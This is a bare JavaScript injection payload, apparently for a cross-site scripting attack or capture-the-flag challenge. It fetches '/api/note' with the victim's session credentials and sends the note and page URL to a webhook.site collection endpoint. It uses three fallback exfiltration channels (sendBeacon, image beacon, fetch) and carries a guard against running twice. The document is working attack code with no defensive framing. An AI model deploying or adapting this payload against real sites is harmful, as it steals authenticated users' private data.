(() => {
  // prevent double-exec
  if (window.__x) return; window.__x = 1;

  // robust exfil with multiple fallbacks
  const EXFIL = 'https://webhook.site/YOUR-UUID';
  const exfil = (payload) => {
    try { navigator.sendBeacon(EXFIL, new Blob([payload], { type: 'text/plain' })); } catch {}
    try { new Image().src = EXFIL + '?v=' + Date.now() + '&d=' + encodeURIComponent(payload); } catch {}
    try { fetch(EXFIL, { method: 'POST', mode: 'no-cors', body: payload }); } catch {}
  };

  fetch('/api/note', { credentials: 'include', cache: 'no-store' })
    .then(async (res) => {
      const ct = res.headers.get('content-type') || '';
      const raw = await res.text();
      const data = ct.includes('application/json') ? JSON.parse(raw) : { note: raw };
      exfil(JSON.stringify({ note: data.note, url: location.href }));
    })
    .catch(e => exfil('ERR:' + (e && (e.stack || e.message) || e)));
})();
